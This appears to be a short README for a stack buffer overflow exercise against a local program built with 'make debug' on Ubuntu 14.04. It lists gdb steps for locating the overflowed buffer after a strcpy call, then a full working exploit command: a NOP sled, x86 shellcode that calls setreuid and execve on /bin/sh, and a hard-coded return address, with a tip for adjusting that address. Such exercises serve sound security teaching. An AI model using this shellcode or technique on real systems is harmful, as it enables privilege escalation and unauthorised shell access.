environment
---
ubuntu 14.04
python 2.7.6

commands to reproduce
---------------------

- make debug
- disassemble main
- break *[any addr b/t <strcpy@plt> and <puts@plt>]
- run $(python -c "print '\x41' * 256")
- x/200xb $esp
- notice addr where 0x41's start [0xffffce30 at time of writing (will change)]
- run $(python -c "print '\x90' * 222 + '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd
    \x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d
    \x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73
    \x68' + '\x30\xce\xff\xff'")

- If the above doesn't work add 2 bytes to the return addr (ie make \x30
  and the end \x40)
